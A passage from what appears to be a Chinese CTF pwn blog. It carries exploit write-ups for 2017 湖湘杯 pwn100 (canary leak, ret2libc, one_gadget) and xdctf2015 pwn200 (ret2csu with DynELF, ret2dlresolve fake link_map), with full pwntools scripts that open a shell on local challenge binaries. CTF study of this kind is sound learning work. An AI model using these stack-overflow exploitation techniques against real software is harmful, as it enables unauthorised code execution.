class="string">&#x27;A&#x27;</span>*<span class="number">4</span>+p32(setbuf_got))</span><br><span class="line"><span class="comment">#程序用base64对输入值进行了加密，所以这里需要进行解密</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">recv= p.recv()</span><br><span class="line"><span class="built_in">print</span> recv</span><br><span class="line">setbuf_addr = u32(recv[recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">7</span>:recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">11</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;setbuf_addr &gt;&gt; &quot;</span>+<span class="built_in">str</span>(setbuf_addr))</span><br><span class="line"></span><br><span class="line">system_offset=libc.symbols[<span class="string">&quot;system&quot;</span>] </span><br><span class="line">setbuf_offset=libc.symbols[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">system_addr=setbuf_addr+system_offset-setbuf_offset</span><br><span class="line"></span><br><span class="line">binsh_offset=<span class="number">0x192352</span>	</span><br><span class="line"><span class="comment">#strings -a -tx /lib/i386-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot; (直接输出16进制)</span></span><br><span class="line">binsh_addr = setbuf_addr+binsh_offset-setbuf_offset</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>)</span><br><span class="line">payload = base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">257</span>+canary+<span class="string">&#x27;A&#x27;</span>*<span class="number">12</span>+p32(system_addr)+<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>+p32(binsh_addr))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>网上还有一个更nb的，自己找libc版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>], arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr = <span class="string">&#x27;0x08048B09&#x27;</span></span>):</span></span><br><span class="line">    raw_input(<span class="string">&#x27;debug:&#x27;</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">&quot;b *&quot;</span> + addr)</span><br><span class="line"></span><br><span class="line">local_MAGIC = <span class="number">0x0003AC69</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;/home/h11p/hackme/huxiangbei/pwns&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x102</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">myCanary=io.recv()[<span class="number">268</span>:<span class="number">271</span>]</span><br><span class="line">Canary=<span class="string">&quot;\x00&quot;</span>+myCanary</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Canary:&quot;</span>+<span class="built_in">hex</span>(u32(Canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x151</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">mylibc=io.recv()[<span class="number">347</span>:<span class="number">351</span>] <span class="comment">#直接开gdb看出来的</span></span><br><span class="line">base_libc=u32(mylibc)-<span class="number">0x18637</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;mylibc_addr:&quot;</span>+<span class="built_in">hex</span>(base_libc)</span><br><span class="line"></span><br><span class="line">MAGIC_addr=local_MAGIC+base_libc <span class="comment">#这个MAGIC是one_gadget</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x101</span>+Canary+<span class="string">&quot;a&quot;</span>*<span class="number">0xc</span>+p32(MAGIC_addr) </span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
<p>我和他的版本不同，我打不通也看不懂，以后再学</p>
<p>地址：<a target="_blank" rel="noopener" href="http://www.javashuo.com/article/p-gbecslst-no.html">2017湖湘杯pwn100的wp - JavaShuo</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/" class="post-title-link" itemprop="url">万能pop+DynELF经典组合(附加ret2dlresolve)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-03 14:07:28" itemprop="dateCreated datePublished" datetime="2022-01-03T14:07:28+08:00">2022-01-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-04 22:34:48" itemprop="dateModified" datetime="2022-01-04T22:34:48+08:00">2022-01-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>事情的起因是我遇到了一道做过的题目，它的代码完全没有改变，只是程序变成了64位</p>
<p>以前我用DynELF直接打通了32位，现在来看64位发现少了一个gadget，于是我脑袋抽了，用“ret2dlresolve”搞了一上午</p>
<p>后来想到了利用“ret2csu”来控制DynELF中的“write”函数</p>
<p>发现这种组合的通用性还挺高，只要程序溢出至少“136字节”就可以打</p>
<p>于是想记录一下，让今后的我少走点弯路</p>
<hr>
<p><strong>2015-xdctf-pwn200</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183143407.png" alt="1641183143407"> </p>
<p>一次输入</p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183182063.png" alt="1641183182063"> </p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183191422.png" alt="1641183191422"> </p>
<p>64位，dynamically，开了NX</p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183209046.png" alt="1641183209046"> </p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183233342.png" alt="1641183233342"> </p>
<p>没有system，没有“/bin/sh”</p>
<p>函数write可以输出的值就是字符串的长度“23字节”</p>
<p>vuln中有read，可以输入“256字节”</p>
<p><strong>入侵思路</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183449006.png" alt="1641183449006"> </p>
<p>程序溢出了“144字节”，有write函数，可以有多种方法打通</p>
<p><strong>DynELF</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x40066E</span></span><br><span class="line">fun_addr=<span class="number">0x400637</span> </span><br><span class="line">bss_addr=<span class="number">0x601050</span>+<span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x000000000400780</span></span><br><span class="line">csu_end_addr=<span class="number">0x00000000040079A</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_got &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(write_got))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx) + p64(rbp)+p64(r12) +p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">	csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, addr, <span class="number">8</span>, main_addr)</span><br><span class="line">	data=p.recv(<span class="number">8</span>)</span><br><span class="line">	log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (addr, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))) </span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">		</span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line"></span><br><span class="line">execve_addr=d.lookup(<span class="string">&#x27;execve&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve_addr: &quot;</span>+<span class="built_in">hex</span>(execve_addr))</span><br><span class="line"></span><br><span class="line">payload=p64(execve_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_addr, <span class="built_in">len</span>(payload), main_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, bss_addr+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>注意：</strong>(每一条都是血的教训)</p>
<p>因为DynELF模块在执行的过程中会输出一下字符串，所以“p.recvuntil”必须有</p>
<p>不同程序的csu可能不同，有时需要修改模板</p>
<p>另外我也尝试过用“system”但是打不通（可能是环境问题）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, addr, <span class="number">8</span>, main_addr)</span><br></pre></td></tr></table></figure>
<p>用csu包装的函数视乎只认识GOT表，用其他的就报错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(execve_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_addr, <span class="built_in">len</span>(payload), main_addr)</span><br><span class="line"><span class="comment">#read(0, bss_addr, len(payload))</span></span><br><span class="line">p.send(payload)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, bss_addr+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line"><span class="comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span></span><br></pre></td></tr></table></figure>
<p>必须利用“read”把泄露出来的“execve”写在某个地址上，只有这样才可以调用“execve”</p>
<p>​        //我也尝试过用其他姿势来调用“execve”，但是都报错了</p>
<hr>
<p><strong>ret2dlresolve</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>) <span class="comment">#程序使用这个库文件</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">bss = <span class="number">0x601050</span>  </span><br><span class="line">bss_stage = bss + <span class="number">0x100</span></span><br><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line"><span class="comment">#目标函数和已知函数的偏移（把‘write’重定位成‘system’）</span></span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span>  </span><br><span class="line">pop_rsi = <span class="number">0x4007a1</span> </span><br><span class="line">plt_load = <span class="number">0x400506</span> <span class="comment">#plt[1](dl_runtime_resolve)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span></span><br><span class="line">    <span class="comment">#offset为负数，可以用‘(2 ** 64 - 1)’来控制范围 </span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0</span>) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) </span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) </span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) </span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, write_got ,l_addr)</span><br><span class="line">payload = flat( <span class="string">&#x27;a&#x27;</span> * <span class="number">120</span> ,pop_rdi, <span class="number">0</span> , pop_rsi , bss_stage , <span class="number">0</span> , read_plt , pop_rsi , <span class="number">0</span> ,<span class="number">0</span> , pop_rdi , bss_stage + <span class="number">0x48</span>  , plt_load , bss_stage , <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">read_plt触发时输入‘fake_link_map’，plt_load就是dl_runtime_resolve，控制程序手段执行dl_runtime_resolve，此时‘bss_stage’被当做第一个参数，‘0’被当做第二个参数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)  </span><br><span class="line">r.sendline(payload)  </span><br><span class="line"></span><br><span class="line">r.send(fake_link_map) <span class="comment">#把write重定位为system</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>可以来看一下fake_Linkmap_payload的栈帧:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| fake_linkmap_addr+<span class="number">0x00</span>  --&gt; offset <span class="comment">//DT_STRTAB（随便设置的）</span></span><br><span class="line"><span class="number">0008</span>| fake_linkmap_addr+<span class="number">0x08</span>  --&gt; <span class="number">0</span>	<span class="comment">//DT_JMPREL</span></span><br><span class="line"><span class="number">0010</span>| fake_linkmap_addr+<span class="number">0x10</span>  --&gt; fake_linkmap_addr + <span class="number">0x18</span> </span><br><span class="line"><span class="number">0018</span>| fake_linkmap_addr+<span class="number">0x18</span>  --&gt; fake_linkmap_addr + <span class="number">0x30</span> - offset </span><br><span class="line"><span class="number">0020</span>| fake_linkmap_addr+<span class="number">0x20</span>  --&gt; <span class="number">0x7</span></span><br><span class="line"><span class="number">0028</span>| fake_linkmap_addr+<span class="number">0x28</span>  --&gt; <span class="number">0</span> </span><br><span class="line"><span class="number">0030</span>| fake_linkmap_addr+<span class="number">0x30</span>  --&gt; <span class="number">0</span> </span><br><span class="line"><span class="number">0038</span>| fake_linkmap_addr+<span class="number">0x38</span>  --&gt; <span class="number">0</span> <span class="comment">//DT_SYMTAB</span></span><br><span class="line"><span class="number">0040</span>| fake_linkmap_addr+<span class="number">0x40</span>  --&gt; known_func_ptr - <span class="number">0x8</span> </span><br><span class="line"><span class="number">0048</span>| fake_linkmap_addr+<span class="number">0x48</span>  --&gt; b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span></span><br><span class="line">.................................... </span><br><span class="line"><span class="number">0068</span>| fake_linkmap_addr+<span class="number">0x68</span>  --&gt; fake_linkmap_addr </span><br><span class="line">    <span class="comment">//对应的值是DT_STRTAB的地址(fake_linkmap_addr)</span></span><br><span class="line"><span class="number">0070</span>| fake_linkmap_addr+<span class="number">0x70</span>  --&gt; fake_linkmap_addr + <span class="number">0x38</span> </span><br><span class="line">    <span class="comment">//对应的值是DT_SYMTAB的地址(fake_linkmap_addr + 0x38)</span></span><br><span class="line">.................................... </span><br><span class="line"><span class="number">00f</span>8| fake_linkmap_addr+<span class="number">0xf8</span>  --&gt; fake_linkmap_addr + <span class="number">0x8</span>   </span><br><span class="line">    <span class="comment">//对应的值是DT_JMPREL的地址(fake_linkmap_addr + 0x8)</span></span><br></pre></td></tr></table></figure>
<p><strong>dl_runtime_resolve</strong>被手动调用时，会读取“bss_stage”上的数据为“link_map”然后获取“JMPREL”，“SYMTAB”，“DT_STRTAB”，问题的关键就在于把它们三个的 <strong>“索引”</strong> 都弄成“0”，才能进行伪装</p>
<p>这种伪装方式不需要“JMPREL”，“SYMTAB”，“DT_STRTAB”的地址，只要一个已知函数的GOT表地址，和libc版本就可以了</p>
<hr>
<p><strong>注意：</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641234781843.png" alt="1641234781843"> </p>
<p>重定位入口的符号类型（一般为“0x7”）在“JMPREL”中看</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/" class="post-title-link" itemprop="url">各种模板</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-02 22:35:12" itemprop="dateCreated datePublished" datetime="2022-01-02T22:35:12+08:00">2022-01-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-03 17:30:18" itemprop="dateModified" datetime="2022-04-03T17:30:18+08:00">2022-04-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="各种模板"><a href="#各种模板" class="headerlink" title="各种模板"></a>各种模板</h2><p>pwn题中有许多目标模板，灵活利用可以节约大量时间</p>
<p>我打算把我遇到的所有模板都挂在这里，方便以后查找</p>
<hr>
<h2 id="CSU-万能pop模板"><a href="#CSU-万能pop模板" class="headerlink" title="CSU-万能pop模板"></a>CSU-万能pop模板</h2><p>当程序的常规gadgets不能满足需求时（通常是缺少“pop_rdx”），就需要万能pop</p>
<p>如果用<strong>csu</strong>进行寄存器赋值，需要两个重要的ROPgadgets：</p>
<p>csu_front_addr：</p>
<img src="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126255915-1642995722008-1647496563602.png" class width="1641126255915"> 
<p> csu_end_addr：</p>
<img src="/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126386447-1642995722010-1647496563602.png" class width="1641126386447"> 
<p>这两个gadgets相互配合就可以执行任何已知函数</p>
<p>不同的程序csu可能不同（寄存器顺序不同），一定要确认并修改</p>
